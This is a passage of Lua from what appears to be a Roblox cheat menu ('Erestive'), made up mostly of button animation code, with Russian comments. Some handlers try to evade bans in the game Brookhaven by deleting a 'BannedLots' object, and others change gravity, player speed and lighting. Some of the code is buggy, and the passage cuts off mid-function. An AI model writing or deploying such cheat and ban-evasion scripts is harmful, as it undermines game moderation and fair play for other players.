		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_162);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.Button.LocalScript
local function C_166()
local script = G2L["166"];
	local noviticat = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.noviticat
	
	local NameTextT = "Brookhaven"
	local SubTextT = "Successfully ban removed"
	
	local NameText = noviticat.antiban.TextLabel1.Text
	local SubText = noviticat.antiban.TextLabel2.Text
	
	NameText = NameTextT
	SubText = SubTextT
	
	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.BannedLots:Destroy()
	end)
	
	
end;
task.spawn(C_166);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_176()
local script = G2L["176"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_176);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_17a()
local script = G2L["17a"];
	local UserInputService = game:GetService("UserInputService")
	
	-- Функция активации захвата мыши
	local function EnableMouseLock()
		UserInputService.MouseIconEnabled = false -- Убираем стандартный вид курсора
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter -- Захватываем мышь в центре экрана
	end
	
	-- Подключаем событие нажатия кнопки
	script.Parent.MouseButton1Click:Connect(function()
		EnableMouseLock() -- Включаем захват мыши при клике
	
		script.Parent.Parent.Parent.FOVSuccess:TweenPosition(
			UDim2.new(-1.042, 0, 3.23, 0),
			"In",
			"Linear",
			0.1,
			true
		)
		wait(3)
		script.Parent.Parent.Parent.FOVSuccess:TweenPosition(
			UDim2.new(-1.042, 0, 3.7, 0),
			"In",
			"Linear",
			0.1,
			true
		)
	end)
end;
task.spawn(C_17a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_180()
local script = G2L["180"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_180);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_184()
local script = G2L["184"];
	local UserInputService = game:GetService("UserInputService")
	
	-- Функция активации захвата мыши
	local function EnableMouseLock()
		UserInputService.MouseIconEnabled = true -- Убираем стандартный вид курсора
		UserInputService.MouseBehavior = Enum.MouseBehavior.Default -- Захватываем мышь в центре экрана
	end
	
	-- Подключаем событие нажатия кнопки
	script.Parent.MouseButton1Click:Connect(function()
		EnableMouseLock() -- Включаем захват мыши при клике
	
		script.Parent.Parent.Parent.FOVSuccess:TweenPosition(
			UDim2.new(-1.042, 0, 3.23, 0),
			"In",
			"Linear",
			0.1,
			true
		)
		wait(3)
		script.Parent.Parent.Parent.FOVSuccess:TweenPosition(
			UDim2.new(-1.042, 0, 3.7, 0),
			"In",
			"Linear",
			0.1,
			true
		)
	end)
end;
task.spawn(C_184);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Animations
local function C_193()
local script = G2L["193"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_193);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_197()
local script = G2L["197"];
	-- Gravity
	script.Parent.MouseButton1Click:Connect(function()
		local gravityValueText = script.Parent.Parent.Parent.FOVSet.Text
		local success, numberValue = pcall(tonumber, gravityValueText)
	
		if success then
			game.Workspace.Gravity = numberValue
	
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(
				UDim2.new(-1.042, 0, 3.23, 0),
				"In",
				"Linear",
				0.1,
				true
			)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(
				UDim2.new(-1.042, 0, 3.7, 0),
				"In",
				"Linear",
				0.1,
				true
			)
		else
			warn("Некорректное значение гравитации!")
		end
	end)
end;
task.spawn(C_197);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Button.Animations
local function C_198()
local script = G2L["198"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_198);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet2.LocalScript
local function C_1ac()
local script = G2L["1ac"];
	script.Parent.MouseButton1Click:Connect(function()
	
			local TextBox = script.Parent.Parent.FOVSet.Text
			local Gui = script.Parent.Parent.NeverGuis
			
			Gui:Clone()
			Gui.Parent = game.Workspace[TextBox]
	end)
end;
task.spawn(C_1ac);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet3.LocalScript
local function C_1ae()
local script = G2L["1ae"];
	script.Parent.MouseButton1Click:Connect(function()
	
			local TextBox = script.Parent.Parent.FOVSet.Text
	
		game.Workspace[TextBox].NeverGuis:destroy()
	end)
end;
task.spawn(C_1ae);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Animations
local function C_1b6()
local script = G2L["1b6"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_1b6);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Button.LocalScript
local function C_1bb()
local script = G2L["1bb"];
	-- Локальный скрипт для обработки события нажатия кнопки
	local button = script.Parent.Parent.Button -- Убедись, что кнопка названа именно так!
	
	button.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.OnOrOff.Text == "On" then
			button.BackgroundColor3 = Color3.new(0.215686, 0, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
		else
			button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
		end
	end)
end;
task.spawn(C_1bb);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.FOVSet.LocalScript
local function C_1cc()
local script = G2L["1cc"];
	local TextBox = script.Parent
	
	-- Обработчик события FocusLost
	TextBox.FocusLost:Connect(function()
		local inputText = TextBox.Text
	
		-- Проверяем каждую букву и оставляем только цифры
		local filteredText = ""
		for i = 1, #inputText do
			local char = string.sub(inputText, i, i)
	
			if string.match(char, "%d") then -- Оставляем только цифры
				filteredText = filteredText .. char
			end
		end
	
		-- Устанавливаем очищенный текст обратно в TextBox
		TextBox.Text = filteredText
	end)
end;
task.spawn(C_1cc);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Animations
local function C_1ce()
local script = G2L["1ce"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_1ce);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Button.Animations
local function C_1d2()
local script = G2L["1d2"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_1d2);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_1d3()
local script = G2L["1d3"];
	local userInputService = game:GetService("UserInputService")
	local binds = {
		Enum.KeyCode.Space,
		Enum.KeyCode.W
	}
	local startSpeed = game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed
	local function setupInputHandlers()
		local inputBeganConnection
		local inputEndedConnection
	
		inputBeganConnection = userInputService.InputBegan:Connect(function(input)
			if script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF.OnOrOff.Text == "On" then
				if input.KeyCode == binds[1] then
					game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = tonumber(script.Parent.Parent.Parent.FOVSet.Text)
				end
			end
		end)
	
		inputEndedConnection = userInputService.InputEnded:Connect(function(input)
			if script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF.OnOrOff.Text == "On" then
				if input.KeyCode == binds[1] then
					game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = startSpeed
				end
			end
		end)
	
		return inputBeganConnection, inputEndedConnection
	end
	
	local inputBeganConn, inputEndedConn
	
	while true do
		wait(0.1)
		if script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF.OnOrOff.Text == "On" then
			if not inputBeganConn or not inputEndedConn then
				inputBeganConn, inputEndedConn = setupInputHandlers()
			end
		else
			-- Отключаем обработчики, если значение "Off"
			if inputBeganConn then
				inputBeganConn:Disconnect()
				inputBeganConn = nil
				game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = startSpeed
			end
			if inputEndedConn then
				inputEndedConn:Disconnect()
				inputEndedConn = nil
				game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = startSpeed
			end
		end
	end
	local inputBeganConn, inputEndedConn   -- Глобальные переменные для хранения подключённых обработчиков
	
	while true do
	    wait(0.1)                          -- Пауза перед каждой итерацией
	    
	    if script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF.OnOrOff.Text == "On" then
	        if not inputBeganConn or not inputEndedConn then
	            inputBeganConn, inputEndedConn = setupInputHandlers()  -- Устанавливаем обработчики
	        end
	    else
	        -- Если OFF, отключаем обработчики
	        if inputBeganConn then
	            inputBeganConn:Disconnect()
	            inputBeganConn = nil
				game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = startSpeed
	        end
	        
	        if inputEndedConn then
	            inputEndedConn:Disconnect()
	            inputEndedConn = nil
				game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = startSpeed
	        end
	    end
	end
end;
task.spawn(C_1d3);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Animations
local function C_1df()
local script = G2L["1df"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_1df);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Button.LocalScript
local function C_1e4()
local script = G2L["1e4"];
	-- Локальный скрипт для обработки события нажатия кнопки
	local button = script.Parent.Parent.Button -- Убедись, что кнопка названа именно так!
	
	button.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.OnOrOff.Text == "On" then
			button.BackgroundColor3 = Color3.new(0.215686, 0, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
		else
			button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
		end
	end)
end;
task.spawn(C_1e4);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.Animations
local function C_1ef()
local script = G2L["1ef"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_1ef);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.Button.LocalScript
local function C_1f6()
local script = G2L["1f6"];
	local thewhen = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if thewhen == false then
			thewhen = true
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
			game.Lighting.GlobalShadows = false
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.5, 0,0.122, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.566, 0,0.737, 0),"In","Linear",0.05,true)
			wait(0.05)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.301, 0,0.737, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.2, 0,0.122, 0),"In","Linear",0.05,true)
		else
			thewhen = false
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
			game.Lighting.GlobalShadows = true
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.5, 0,0.122, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.566, 0,0.737, 0),"In","Linear",0.05,true)
			wait(0.05)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.301, 0,0.737, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.8, 0,0.122, 0),"In","Linear",0.05,true)
		end
	end)
end;
task.spawn(C_1f6);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.OnOrOff.Shadows
local function C_1fa()
local script = G2L["1fa"];
	if game.Lighting.GlobalShadows == false then
		script.Parent.Text = "Off"
	else
		script.Parent.Text = "On"
	end
end;
task.spawn(C_1fa);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.Animations
local function C_200()
local script = G2L["200"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_200);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.Button.LocalScript
local function C_207()
local script = G2L["207"];
	local thewhen = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if thewhen == false then
			thewhen = true
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
			game.Lighting.EnvironmentSpecularScale = 0
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.5, 0,0.122, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.566, 0,0.737, 0),"In","Linear",0.05,true)
			wait(0.05)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.301, 0,0.737, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.2, 0,0.122, 0),"In","Linear",0.05,true)
		else
			thewhen = false
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
			game.Lighting.EnvironmentSpecularScale = 1
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.5, 0,0.122, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.566, 0,0.737, 0),"In","Linear",0.05,true)
			wait(0.05)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.301, 0,0.737, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.8, 0,0.122, 0),"In","Linear",0.05,true)
		end
	end)
end;
task.spawn(C_207);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.OnOrOff.Shadows
local function C_20b()
local script = G2L["20b"];
	if game.Lighting.GlobalShadows == false then
		script.Parent.Text = "Off"
	else
		script.Parent.Text = "On"
	end
end;
task.spawn(C_20b);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.Animations
local function C_211()
local script = G2L["211"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_211);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Slider.Button.LocalScript
local function C_218()
local script = G2L["218"];
	local thewhen = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if thewhen == false then
			thewhen = true
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
			game.Lighting.EnvironmentDiffuseScale = 0
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.5, 0,0.122, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.566, 0,0.737, 0),"In","Linear",0.05,true)
			wait(0.05)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.301, 0,0.737, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.2, 0,0.122, 0),"In","Linear",0.05,true)
		else
			thewhen = false
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
			game.Lighting.EnvironmentDiffuseScale = 1
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.5, 0,0.122, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.566, 0,0.737, 0),"In","Linear",0.05,true)
			wait(0.05)
			script.Parent.Parent.SliderCircle:TweenSize(UDim2.new(0.301, 0,0.737, 0),"In","Linear",0.05,true)
			script.Parent.Parent.SliderCircle:TweenPosition(UDim2.new(0.8, 0,0.122, 0),"In","Linear",0.05,true)
		end
	end)
end;
task.spawn(C_218);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.OnOrOff.Shadows
local function C_21c()
local script = G2L["21c"];
	if game.Lighting.GlobalShadows == false then
		script.Parent.Text = "Off"
	else
		script.Parent.Text = "On"
	end
end;
task.spawn(C_21c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Animations
local function C_228()
local script = G2L["228"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_228);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_22c()
local script = G2L["22c"];
	Textbox = script.Parent.Parent.Parent.FOVSet.Text
	script.Parent.MouseButton1Click:Connect(function()
		game.Lighting.Ambient = Color3.new(tonumber(Textbox),tonumber(Textbox),tonumber(Textbox))
			 
